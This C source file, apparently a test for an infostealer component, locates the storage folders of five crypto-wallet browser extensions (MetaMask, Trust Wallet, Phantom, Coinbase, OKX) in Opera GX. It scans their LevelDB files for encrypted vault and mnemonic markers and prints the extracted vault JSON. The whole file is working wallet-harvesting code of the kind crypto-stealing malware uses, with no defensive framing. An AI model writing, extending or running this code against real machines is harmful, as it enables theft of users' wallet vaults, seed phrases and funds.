/*
 * test_wallets.c — test crypto wallet extension scanning for Opera GX
 */
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

static const struct { const char *name; const char *id; } CRYPTO_EXT[] = {
    {"TrustWallet", "egjidjbpglichdcondbcbdnbeeppgdph"},
    {"MetaMask",    "nkbihfbeogaeaoehlefnkodbefgpgknn"},
    {"Phantom",     "bfnaelmomeimhlpmgjnjophhpkkoljpa"},
    {"Coinbase",    "hnfanknocfeofbddgcijnmhnfnkdnaad"},
    {"OKXWallet",   "mcohilncbfahbmgdjkbpemcciiolgcge"},
};

static int _scan_ext_ldb(const char *dir, const char *ext_name)
{
    static const char *MARKERS[] = {
        "\"cipher\":\"aes-256-cbc",   /* MetaMask — trailing " may be binary in LDB */
        "\"cipher\":\"aes-128-ctr",   /* Trust Wallet / Ethereum keystore V3 */
        "\"ciphertext\":",
        "\"mnemonic\":",
        NULL
    };

    char pat[MAX_PATH];
    snprintf(pat, sizeof(pat), "%s\\*", dir);
    WIN32_FIND_DATAA fd;
    memset(&fd, 0, sizeof(fd));
    HANDLE hf = FindFirstFileA(pat, &fd);
    if (hf == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "  [!] FindFirstFile failed in %s  err=%lu\n", dir, GetLastError());
        return 0;
    }

    int total = 0;
    do {
        const char *dot = strrchr(fd.cFileName, '.');
        if (!dot) continue;
        if (_stricmp(dot, ".log") != 0 && _stricmp(dot, ".ldb") != 0) continue;

        char fpath[MAX_PATH];
        snprintf(fpath, sizeof(fpath), "%s\\%s", dir, fd.cFileName);

        HANDLE hfile = CreateFileA(fpath, GENERIC_READ,
                                   FILE_SHARE_READ | FILE_SHARE_WRITE,
                                   NULL, OPEN_EXISTING, 0, NULL);
        if (hfile == INVALID_HANDLE_VALUE) {
            fprintf(stderr, "  [!] Cannot open %s  err=%lu\n", fd.cFileName, GetLastError());
            continue;
        }

        LARGE_INTEGER li = {0};
        GetFileSizeEx(hfile, &li);
        fprintf(stderr, "  Scanning %s (%llu bytes)...\n", fd.cFileName, (unsigned long long)li.QuadPart);

        if (li.QuadPart == 0 || li.QuadPart > 8 * 1024 * 1024) {
            CloseHandle(hfile);
            continue;
        }

        uint8_t *buf = (uint8_t *)malloc((size_t)li.QuadPart + 1);
        if (!buf) { CloseHandle(hfile); continue; }
        DWORD rd = 0;
        ReadFile(hfile, buf, (DWORD)li.QuadPart, &rd, NULL);
        CloseHandle(hfile);
        buf[rd] = 0;

        int found_in_file = 0;
        for (int m = 0; MARKERS[m] && !found_in_file; m++) {
            size_t mlen = strlen(MARKERS[m]);
            for (size_t i = 0; i + mlen <= rd && !found_in_file; i++) {
                if (memcmp(buf + i, MARKERS[m], mlen) != 0) continue;

                fprintf(stderr, "  [+] Marker '%s' at offset %zu\n", MARKERS[m], i);

                /* walk back to '{' or '[' */
                size_t js = i;
                while (js > 0 && buf[js] != '{' && buf[js] != '[') js--;
                if (buf[js] != '{' && buf[js] != '[') continue;
                char open = (char)buf[js];
                char close = (open == '[') ? ']' : '}';

                /* walk forward to matching close bracket */
                size_t je = js;
                int depth = 0;
                while (je < rd) {
                    if ((char)buf[je] == open) depth++;
                    else if ((char)buf[je] == close) { if (--depth == 0) { je++; break; } }
                    je++;
                }
                if (depth != 0) continue;

                size_t jlen = je - js;
                if (jlen < 10 || jlen > 16384) continue;

                /* Sanitize binary LDB framing bytes */
                char san[16384];
                size_t slen = jlen < sizeof(san) - 1 ? jlen : sizeof(san) - 1;
                for (size_t k = 0; k < slen; k++) {
                    uint8_t b = buf[js + k];
                    san[k] = (b >= 0x20 && b < 0x7f) ? (char)b : '?';
                }
                san[slen] = 0;

                printf("[wallet] OperaGX/Default/%s: %s\n", ext_name, san);
                total++;
                found_in_file = 1;
            }
        }

        if (!found_in_file)
            fprintf(stderr, "  [-] No vault markers in %s\n", fd.cFileName);

        free(buf);
    } while (FindNextFileA(hf, &fd));
    FindClose(hf);
    return total;
}

int main(void)
{
    char base[MAX_PATH] = {0};
    ExpandEnvironmentStringsA(
        "%APPDATA%\\Opera Software\\Opera GX Stable\\Default\\Local Extension Settings",
        base, sizeof(base));

    fprintf(stderr, "Base: %s\n", base);
    if (GetFileAttributesA(base) == INVALID_FILE_ATTRIBUTES) {
        fprintf(stderr, "Directory not found\n");
        return 1;
    }

    int total = 0;
    for (int i = 0; i < (int)(sizeof(CRYPTO_EXT) / sizeof(CRYPTO_EXT[0])); i++) {
        char extdir[MAX_PATH];
        snprintf(extdir, sizeof(extdir), "%s\\%s", base, CRYPTO_EXT[i].id);
        if (GetFileAttributesA(extdir) == INVALID_FILE_ATTRIBUTES) continue;
        fprintf(stderr, "[*] Found %s (%s)\n", CRYPTO_EXT[i].name, CRYPTO_EXT[i].id);
        total += _scan_ext_ldb(extdir, CRYPTO_EXT[i].name);
    }

    fprintf(stderr, "\nTotal vaults found: %d\n", total);
    return total > 0 ? 0 : 1;
}
